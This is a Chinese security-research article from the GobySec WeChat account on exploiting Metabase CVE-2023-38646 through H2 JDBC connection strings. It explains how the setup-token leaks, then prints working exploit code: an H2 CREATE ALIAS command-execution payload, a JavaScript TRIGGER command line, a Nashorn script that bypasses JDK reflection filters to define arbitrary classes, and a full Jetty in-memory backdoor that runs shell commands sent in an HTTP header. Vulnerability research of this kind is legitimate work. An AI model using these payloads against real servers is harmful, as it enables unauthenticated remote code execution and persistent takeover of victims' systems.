#  漏洞分析｜Metabase 远程代码执行(CVE-2023-38646): H2 JDBC 深入利用   
路人甲  GobySec   2023-07-28 15:44  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/GGOWG0fficjLTMIjhRPrloPMpJ4nXfwsIjLDB23mjUrGc3G8Qwo770yYCQAnyVhPGKiaSgfVu0HKnfhT4v5hSWcQ/640?wx_fmt=gif "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjLVsnYdd0PiaCzAr1V8cElzgklAbCNG2icf3v0xObqhF1zc1YqYI9PTVgnw99mvk8W6vWxEfKXEyYGQ/640?wx_fmt=png "")  
  
G  
o  
b  
y  
社  
区  
第  
   
29  
   
篇  
技  
术  
分  
享  
文  
章  
  
全  
文  
共  
：  
10227  
   
字  
   
   
   
预  
计  
阅  
读  
时  
间  
：  
2  
0  
   
分  
钟  
  
![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjKzq4TFicia2yUjianoH80KtrWElvrR0XQbqBDCHC68DicU6TwYLR54jEJE3rqy2icwicrV85dICfKrJsOQ/640?wx_fmt=png "")  
  
   
**01**  
****  
**概述**  
  
最近 Metabase 出了一个远程代码执行漏洞（CVE-2023-38646），我们通过研究分析发现该漏洞是通过 JDBC 来利用的。在 Metabase 中兼容了多种数据库，本次漏洞中主要通过 H2 JDBC 连接信息触发漏洞。目前公开针对 H2 数据库深入利用的技术仅能做到简单命令执行，无法满足实际攻防场景。  
  
之前 pyn3rd 发布的 《Make JDBC Attacks Brilliant Again I 》 对 H2 数据库的利用中可以通过 RUNSCRIPT、TRIGGER 来执行代码，**通过本次漏洞利用 TRIGGER + DefineClass 完整的实现了 JAVA 代码执行和漏洞回显，且在公开仅支持 Jetty10 版本的情况下兼容到了 Jetty11**，以下是我们在 Goby 中成果。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjKzq4TFicia2yUjianoH80KtrWElvrR0XQbqBDCHC68DicU6TwYLR54jEJE3rqy2icwicrV85dICfKrJsOQ/640?wx_fmt=png "")  
  
   
**02**  
****  
**环境构建**  
  
研究采用 Vulfocus 构建，由于 Meabse 在官方 Docker 只有 x86 架构，为了我们 M1 芯片研究更高效，我们制作了 ARM 架构的镜像。  
  
在线环境：  
https://vulfocus.cn/#/dashboard?image_id=4a5e263f-8662-46bf-a67a-13bd72cf976c  
  
离线环境：  
docker run -d -P vulfocus/vcpe-1.0-a-metabase-metabase:0.46.6-openjdk-release  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjKzq4TFicia2yUjianoH80KtrWElvrR0XQbqBDCHC68DicU6TwYLR54jEJE3rqy2icwicrV85dICfKrJsOQ/640?wx_fmt=png "")  
  
   
**03**  
****  
**漏洞分析**  
  
本次漏洞主要是由于 Metabase 中数据库连接中出现的安全风险漏洞，在整个产品可通过 Metabase 安装时配置数据源数据库以及在安装之后在系统管理中配置数据库信息。所以整体的漏洞点即可通过安装以及配置数据源开始。  
  
在产品安装时会调用   
/api/setup/validate  
 来对参数校验，其中最为核心的部分对数据库的连接信息校验。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjLVsnYdd0PiaCzAr1V8cElzgYru1uxmj0T1WPh2DgKW4XhLys4cXve4rqyfrIefZEk5sEcrTHWvliaw/640?wx_fmt=png "")  
  
从函数调用的逻辑来看，  
/api/setup/validate  
 会通过   
api.database/test-database-connection   
来处  
理输入的参数完成对数据库的校验。但本身   
api.database/test-database-connection  
 其实就是   
POST /api/database  
 路由的核心处理参数。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjLVsnYdd0PiaCzAr1V8cElzgHYAyKWHauMccsyOfCxH4eiag5V83pn6k89G49e1icFZJcjoK1iaeO97Yw/640?wx_fmt=png "")  
  
从整体的逻辑来看，该漏洞可通过   
setup  
、  
database  
 两种方式来完成对漏洞验证，不同的是   
setup  
 方式在安装时是不需要权限的，  
database  
 需要管理员权限。  
  
setup  
 在安装时会校验   
setup-token  
 参数是否正确，来判断是否要进行下步的数据库连接。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjLVsnYdd0PiaCzAr1V8cElzgibHjgpvUYdYrX0C8XhlaOvVxYKanEIibICZo8ndVLnkdIUvSsKXjUD2A/640?wx_fmt=png "")  
  
而   
setup-token  
 在进行生成的时候被默认设置为了   
public  
 权限，所以可以通过   
/api/session/properties  
 来读取。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjLVsnYdd0PiaCzAr1V8cElzgxMNpgE6NnQmwibAib3fBqbvjt3Hz69aoHjQQpzSYvNEydnrzvLCNvUGw/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjLVsnYdd0PiaCzAr1V8cElzgZWficIL5qcV8XmoiaoVxJk3kxL101JJzCtHVJBFKKcmichlwIc5rkBVsQ/640?wx_fmt=png "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjKzq4TFicia2yUjianoH80KtrWElvrR0XQbqBDCHC68DicU6TwYLR54jEJE3rqy2icwicrV85dICfKrJsOQ/640?wx_fmt=png "")  
  
   
**04**  
****  
**深入利用**  
  
在漏洞分析章节中说明，我们可以通过   
setup + setup-token  
 来完整的漏洞利用。在利用时主要依靠于数据库的类型，  
目前 Metabase 支  
持多种数据库，本次我们重点说明 H2 数据库的深入利用，目前最为常用利用方式是   
RUNSCRIPT  
 、  
TRIGGER  
 来完成对漏洞的利用。  
  
H2 数据库在数据库时拥有函数   
init  
 参数，该参数可以执行任意一条 SQL 语句，所以在整体围绕利用中主要通过一条 SQL 语句变换成完美的漏洞利用链条。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjLVsnYdd0PiaCzAr1V8cElzgHQRLYib7ibzTtbkN5P0JfFDIOkA9ZjeZllEo4VRXsXJ0Qu0loiaWh7bSw/640?wx_fmt=png "")  
### 4.1 RUNSCRIRT  
  
RUNSCRIPT FROM  
 可以使用 HTTP 协议执行远程的 SQL 语句，那么在利用的时候我们即可构造恶意的 SQL 语句来完成对漏洞利用。  
  
在执行 SQL 语句时   
CREATE ALIAS  
 来会将内容值进行   
javac  
 编译之后然后运行。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjLVsnYdd0PiaCzAr1V8cElzg0XHa6nx6hhia3rqqzGScRlUCJaQjebj6WxTWEd6usFEb5oiblQO7KBeQ/640?wx_fmt=png "")  
```
DROP ALIAS IF EXISTS sehll;CREATE ALIAS sehll AS 'String shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd);return "hello";}';CALL sehll ('touch /tmp/123')
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjLVsnYdd0PiaCzAr1V8cElzgdSfUciaLB1icmjRFWBYIibtq5x3bll9G9p16nibJQkYNtVt86kL4fuWHtA/640?wx_fmt=png "")  
  
需要注意的是默认官方发布的 Docker 镜像中没用   
javc  
 命令，所以   
CREATE ALIAS  
  无法正常使用。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjLVsnYdd0PiaCzAr1V8cElzgjR6hppqHjwQ4yfvpPJoMZrNKdxTE0UzyExBY5k1agIjwialmCJBXrVg/640?wx_fmt=png "")  
  
但是该方式需要依赖 HTTP 服务，通常禁止向外部网络建立 HTTP 协议请求，所以这种方式在真实的攻击中发挥的作用就会小很多。  
### 4.2 TRIGGER  
  
H2 在解析   
init  
 参数时对   
CREATE TRIGGER  
 会由   
loadFromSource  
 做特殊处理，根据执行内容的开头来判断是否为需要通过   
javascript  
 引擎执行。如果以   
//javascript  
 开头就会通过   
javascript  
 引擎进行编译然后进行执行。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjLVsnYdd0PiaCzAr1V8cElzgIHIMCpjgZuj5N5pgeFcIOEGAatGNCof1DMmjpQF5oYr3SH1zlx8l7g/640?wx_fmt=png "")  
  
我们就可以通过   
javascript  
 引擎来实现代码执行，不过该方式在 JDK 15 之后移除了默认的解析，但是有意思的是 Metabase 在项目中使用到了   
js  
 引擎技术。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjLVsnYdd0PiaCzAr1V8cElzgbJrPAjI5cbqHcfPz80AfCAz5diam6eNiaPW8g1weo13IsibFEhrjcQEibw/640?wx_fmt=png "")  
  
最后我们即可构建   
javascript  
 引擎来构建代码执行，如：  
```
java.lang.Runtime.getRuntime().exec('touch /tmp/999')
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjLVsnYdd0PiaCzAr1V8cElzgRR6ZwggrTbspzMFgjM5Sia0mH0diavWdPtVFia6VuPbjXfwclLVLRtjpw/640?wx_fmt=png "")  
### 4.3 Define Class  
  
通过   
TIGGER  
 我们可以进行   
javascript  
 引擎的任意代码执行，所以为了能够更加入的利用非常有必要进行自定义 Class 加载以及执行。由于最新版的 Metabase 对 JDK 运行产生了限制必须要求为 JDK >= 11，所以就必须要解决 JDK9 modules、JDK 11 ReflectionFilter 的问题。  
  
针对类似问题，我们对 javascript 脚本进行了高度的兼容以及高版本 JDK 的 Bypass 操作，核心代码如下：  
```
try {
  load("nashorn:mozilla_compat.js");
} catch (e) {}
function getUnsafe(){
  var theUnsafeMethod = java.lang.Class.forName("sun.misc.Unsafe").getDeclaredField("theUnsafe");
  theUnsafeMethod.setAccessible(true); 
  return theUnsafeMethod.get(null);
}
function removeClassCache(clazz){
  var unsafe = getUnsafe();
  var clazzAnonymousClass = unsafe.defineAnonymousClass(clazz,java.lang.Class.forName("java.lang.Class").getResourceAsStream("Class.class").readAllBytes(),null);
  var reflectionDataField = clazzAnonymousClass.getDeclaredField("reflectionData");
  unsafe.putObject(clazz,unsafe.objectFieldOffset(reflectionDataField),null);
}
function bypassReflectionFilter() {
  var reflectionClass;
  try {
    reflectionClass = java.lang.Class.forName("jdk.internal.reflect.Reflection");
  } catch (error) {
    reflectionClass = java.lang.Class.forName("sun.reflect.Reflection");
  }
  var unsafe = getUnsafe();
  var classBuffer = reflectionClass.getResourceAsStream("Reflection.class").readAllBytes();
  var reflectionAnonymousClass = unsafe.defineAnonymousClass(reflectionClass, classBuffer, null);
  var fieldFilterMapField = reflectionAnonymousClass.getDeclaredField("fieldFilterMap");
  var methodFilterMapField = reflectionAnonymousClass.getDeclaredField("methodFilterMap");
  if (fieldFilterMapField.getType().isAssignableFrom(java.lang.Class.forName("java.util.HashMap"))) {
    unsafe.putObject(reflectionClass, unsafe.staticFieldOffset(fieldFilterMapField), java.lang.Class.forName("java.util.HashMap").getConstructor().newInstance());
  }
  if (methodFilterMapField.getType().isAssignableFrom(java.lang.Class.forName("java.util.HashMap"))) {
    unsafe.putObject(reflectionClass, unsafe.staticFieldOffset(methodFilterMapField), java.lang.Class.forName("java.util.HashMap").getConstructor().newInstance());
  }
  removeClassCache(java.lang.Class.forName("java.lang.Class"));
}
function setAccessible(accessibleObject){
    var unsafe = getUnsafe();
    var overrideField = java.lang.Class.forName("java.lang.reflect.AccessibleObject").getDeclaredField("override");
    var offset = unsafe.objectFieldOffset(overrideField);
    unsafe.putBoolean(accessibleObject, offset, true);
}
function defineClass(){
  var clz = null;
  var version = java.lang.System.getProperty("java.version");
  var unsafe = getUnsafe();
  var classLoader = new java.net.URLClassLoader(java.lang.reflect.Array.newInstance(java.lang.Class.forName("java.net.URL"), 0));
  try{
    if (version.split(".")[0] >= 11) {
      bypassReflectionFilter();
    defineClassMethod = java.lang.Class.forName("java.lang.ClassLoader").getDeclaredMethod("defineClass", java.lang.Class.forName("[B"),java.lang.Integer.TYPE, java.lang.Integer.TYPE);
    setAccessible(defineClassMethod);
    // 绕过 setAccessible 
    clz = defineClassMethod.invoke(classLoader, bytes, 0, bytes.length);
    }else{
      var protectionDomain = new java.security.ProtectionDomain(new java.security.CodeSource(null, java.lang.reflect.Array.newInstance(java.lang.Class.forName("java.security.cert.Certificate"), 0)), null, classLoader, []);
      clz = unsafe.defineClass(null, bytes, 0, bytes.length, classLoader, protectionDomain);
    }
  }catch(error){
    error.printStackTrace();
  }finally{
    return clz;
  }
}
defineClass();
```  
```
```  
### 4.3 漏洞回显  
  
在漏洞回显时，我们就可以借助   
DefineClass  
 来执行完成对漏洞的回显利用，但是目前最新版本的 Metabase 使用 Jetty11，所以需要针对该版本做回显适配，核心代码如下：  
```
import java.io.OutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Scanner;

/**
 * Jetty CMD 回显马
 * @author R4v3zn woo0nise@gmail.com
 * @version 1.0.1
 */
public class JE2 {

    public JE2(){
        try{
            invoke();
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    public void invoke()throws Exception{
        ThreadGroup group = Thread.currentThread().getThreadGroup();
        java.lang.reflect.Field f = group.getClass().getDeclaredField("threads");
        f.setAccessible(true);
        Thread[] threads = (Thread[]) f.get(group);
        thread : for (Thread thread: threads) {
            try{
                Field threadLocalsField = thread.getClass().getDeclaredField("threadLocals");
                threadLocalsField.setAccessible(true);
                Object threadLocals = threadLocalsField.get(thread);
                if (threadLocals == null){
                    continue;
                }
                Field tableField = threadLocals.getClass().getDeclaredField("table");
                tableField.setAccessible(true);
                Object tableValue = tableField.get(threadLocals);
                if (tableValue == null){
                    continue;
                }
                Object[] tables =  (Object[])tableValue;
                for (Object table:tables) {
                    if (table == null){
                        continue;
                    }
                    Field valueField = table.getClass().getDeclaredField("value");
                    valueField.setAccessible(true);
                    Object value = valueField.get(table);
                    if (value == null){
                        continue;
                    }
                    System.out.println(value.getClass().getName());
                    if(value.getClass().getName().endsWith("AsyncHttpConnection")){
                        Method method = value.getClass().getMethod("getRequest", null);
                        value = method.invoke(value, null);
                        method = value.getClass().getMethod("getHeader", new Class[]{String.class});
                        String cmd = (String)method.invoke(value, new Object[]{"cmd"});
                        String result = "\n"+exec(cmd);
                        method = value.getClass().getMethod("getPrintWriter", new Class[]{String.class});
                        java.io.PrintWriter printWriter = (java.io.PrintWriter)method.invoke(value, new Object[]{"utf-8"});
                        printWriter.println(result);
                        printWriter.flush();
                        break thread;
                    }else if(value.getClass().getName().endsWith("HttpConnection")){
                        Method method = value.getClass().getDeclaredMethod("getHttpChannel", null);
                        Object httpChannel = method.invoke(value, null);
                        method = httpChannel.getClass().getMethod("getRequest", null);
                        value = method.invoke(httpChannel, null);
                        method = value.getClass().getMethod("getHeader", new Class[]{String.class});
                        String cmd = (String)method.invoke(value, new Object[]{"cmd"});
                        String result = "\n"+exec(cmd);
                        method = httpChannel.getClass().getMethod("getResponse", null);
                        value = method.invoke(httpChannel, null);
                        method = value.getClass().getMethod("getWriter", null);
                        java.io.PrintWriter printWriter = (java.io.PrintWriter)method.invoke(value, null);
                        printWriter.println(result);
                        printWriter.flush();
                        break thread;
                    }else if (value.getClass().getName().endsWith("Channel")){
                        Field underlyingOutputField = value.getClass().getDeclaredField("underlyingOutput");
                        underlyingOutputField.setAccessible(true);
                        Object underlyingOutput = underlyingOutputField.get(value);
                        Object httpConnection;
                        try{
                            Field _channelField = underlyingOutput.getClass().getDeclaredField("_channel");
                            _channelField.setAccessible(true);
                            httpConnection = _channelField.get(underlyingOutput);
                        }catch (Exception e){
                            Field connectionField = underlyingOutput.getClass().getDeclaredField("this$0");
                            connectionField.setAccessible(true);
                            httpConnection = connectionField.get(underlyingOutput);
                        }
                        Object request = httpConnection.getClass().getMethod("getRequest").invoke(httpConnection);
                        Object response = httpConnection.getClass().getMethod("getResponse").invoke(httpConnection);
                        String cmd = (String) request.getClass().getMethod("getHeader", String.class).invoke(request, "cmd");
                        OutputStream outputStream = (OutputStream)response.getClass().getMethod("getOutputStream").invoke(response);
                        String result = "\n"+exec(cmd);
                        outputStream.write(result.getBytes());
                        outputStream.flush();
                        break thread;
                    }
                }
            }catch (Exception e){}
        }
    }

    public String exec(String cmd){
        if (cmd != null && !"".equals(cmd)) {
            String os = System.getProperty("os.name").toLowerCase();
            cmd = cmd.trim();
            Process process = null;
            String[] executeCmd = null;
            if (os.contains("win")) {
                if (cmd.contains("ping") && !cmd.contains("-n")) {
                    cmd = cmd + " -n 4";
                }
                executeCmd = new String[]{"cmd", "/c", cmd};
            } else {
                if (cmd.contains("ping") && !cmd.contains("-n")) {
                    cmd = cmd + " -t 4";
                }
                executeCmd = new String[]{"sh", "-c", cmd};
            }
            try {
                process = Runtime.getRuntime().exec(executeCmd);
                Scanner s = new Scanner(process.getInputStream()).useDelimiter("\\a");
                String output = s.hasNext() ? s.next() : "";
                s = new Scanner(process.getErrorStream()).useDelimiter("\\a");
                output += s.hasNext()?s.next():"";
                return output;
            } catch (Exception e) {
                e.printStackTrace();
                return e.toString();
            } finally {
                if (process != null) {
                    process.destroy();
                }
            }
        } else {
            return "command not null";
        }
    }
}
```  
```
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjKzq4TFicia2yUjianoH80KtrWElvrR0XQbqBDCHC68DicU6TwYLR54jEJE3rqy2icwicrV85dICfKrJsOQ/640?wx_fmt=png "")  
  
   
**05**  
****  
**总结**  
  
本次漏洞利用数据库连接信息触发漏洞，利用 H2 导致可以进行任意命令。我们采用   
TRIGGER  
  +   
DefineClass  
 完成对漏洞的利用，通过我们的研究分析发现该技术不光可应用在数据库连接中，更多可应用于 H2 的 SQL 注入，完成 SQL 注入 ->  代码执行的过程。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjKzq4TFicia2yUjianoH80KtrWElvrR0XQbqBDCHC68DicU6TwYLR54jEJE3rqy2icwicrV85dICfKrJsOQ/640?wx_fmt=png "")  
  
   
**06**  
****  
**参考**  
- https://pyn3rd.github.io/2022/06/06/Make-JDBC-Attacks-Brillian-Again-I/  
  
![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjKzq4TFicia2yUjianoH80KtrWfiaAtUngV8rgLh0bIibv9SumD1Y9ZmphGxK9lKiakkOWDp2gRsLjZInPg/640?wx_fmt=png "")  
  
**最新****Goby 使用技巧分享**  
**：**  
  
[• ](http://mp.weixin.qq.com/s?__biz=MzI4MzcwNTAzOQ==&mid=2247510124&idx=1&sn=de3aef91a47b6472d987c2fb7e6f3f6e&chksm=eb8443ccdcf3cadaa4c0ceb1905e14a9d7f3f01bf44f272bd0821c7359db0a847d8533c7abe2&scene=21#wechat_redirect)  
[su18 | Goby反序列化漏洞打入内存马【利用篇】](http://mp.weixin.qq.com/s?__biz=MzI4MzcwNTAzOQ==&mid=2247521997&idx=1&sn=d3c444f95c97f06b1d24240a91bd898d&chksm=eb847d6ddcf3f47b0c50ab4a97b2adbee3241149d9a3ac5a56958e76ac33ede48e0bbd108952&scene=21#wechat_redirect)  
  
  
[• 14m3ta7k | 跨越语言的艺术：Weblogic序列化漏洞与IIOP协议](http://mp.weixin.qq.com/s?__biz=MzI4MzcwNTAzOQ==&mid=2247527734&idx=1&sn=93073a73437cfee6dd2c91dce0331a48&chksm=eb848696dcf30f80bd676f6000ec92283893ecce08ec2abe571d0a4d908b0f9046512259b727&scene=21#wechat_redirect)  
  
  
[• 14m3ta7k | Weblogic CVE-2023-21931漏洞挖掘技技巧：后反序列化利用](http://mp.weixin.qq.com/s?__biz=MzI4MzcwNTAzOQ==&mid=2247527913&idx=1&sn=f3dce554430b75bc9bd5c1e76dde5587&chksm=eb848649dcf30f5f829b8e51a85390b2581f29b0a164d67fa164609f84c9ddd6f72de2231100&scene=21#wechat_redirect)  
  
  
[• ](http://mp.weixin.qq.com/s?__biz=MzI4MzcwNTAzOQ==&mid=2247510124&idx=1&sn=de3aef91a47b6472d987c2fb7e6f3f6e&chksm=eb8443ccdcf3cadaa4c0ceb1905e14a9d7f3f01bf44f272bd0821c7359db0a847d8533c7abe2&scene=21#wechat_redirect)  
[kv2 | 死磕RDP协议，从截图和暴破说起](http://mp.weixin.qq.com/s?__biz=MzI4MzcwNTAzOQ==&mid=2247528393&idx=1&sn=74961047a04f95115cb9eab084b1baef&chksm=eb848469dcf30d7fc97318feb7a4c1584dd9ed447d50e679a1a233914f245db1f943c2aa72c5&scene=21#wechat_redirect)  
  
  
[• 14m3ta7k | 死磕Jenkins漏洞回显与利用效果](http://mp.weixin.qq.com/s?__biz=MzI4MzcwNTAzOQ==&mid=2247528988&idx=1&sn=ce221e6ef302aa68a7a50b5946aab1ad&chksm=eb8499bcdcf310aac0dee3d4c1489b7eda0cb8f18ff91ba5f33608dec6e266c0f43fb53d8be4&scene=21#wechat_redirect)  
  
  
  
更  
多  
   
>  
>  
   
   
技  
术  
分  
享  
  
  
  
  
G  
o  
b  
y  
   
欢  
迎  
表  
哥  
/  
表  
姐  
们  
加  
入  
我  
们  
的  
社  
区  
大  
家  
庭  
，  
一  
起  
交  
流  
技  
术  
、  
生  
活  
趣  
事  
、  
奇  
闻  
八  
卦  
，  
结  
交  
无  
数  
白  
帽  
好  
友  
。  
  
也  
欢  
迎  
投  
稿  
到  
   
G  
o  
b  
y  
（  
G  
o  
b  
y  
   
介  
绍  
/  
扫  
描  
/  
口  
令  
爆  
破  
/  
漏  
洞  
利  
用  
/  
插  
件  
开  
发  
/  
   
P  
o  
C  
   
编  
写  
/  
   
I  
P  
   
库  
使  
用  
场  
景  
/  
   
W  
e  
b  
s  
h  
e  
l  
l  
   
/  
漏  
洞  
分  
析  
   
等  
文  
章  
均  
可  
）  
，  
审  
核  
通  
过  
后  
可  
奖  
励  
   
G  
o  
b  
y  
   
红  
队  
版  
，  
快  
来  
加  
入  
微  
信  
群  
体  
验  
吧  
~  
~  
~  
- 微  
信  
群  
：  
公  
众  
号  
发  
暗  
号  
“  
加  
群  
”  
，  
参  
与  
积  
分  
商  
城  
、  
抽  
奖  
等  
众  
多  
有  
趣  
的  
活  
动  
  
- 获  
取  
版  
本  
：  
h  
t  
t  
p  
s  
:  
/  
/  
g  
o  
b  
y  
s  
e  
c  
.  
n  
e  
t  
/  
s  
a  
l  
e  
  
-   
![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjLVsnYdd0PiaCzAr1V8cElzgJlhod7oXgjMibCeSME8sw0ia2zSeZ7UugvjmyUr4wh9V9DJWoBZTjRYg/640?wx_fmt=png "")  
  
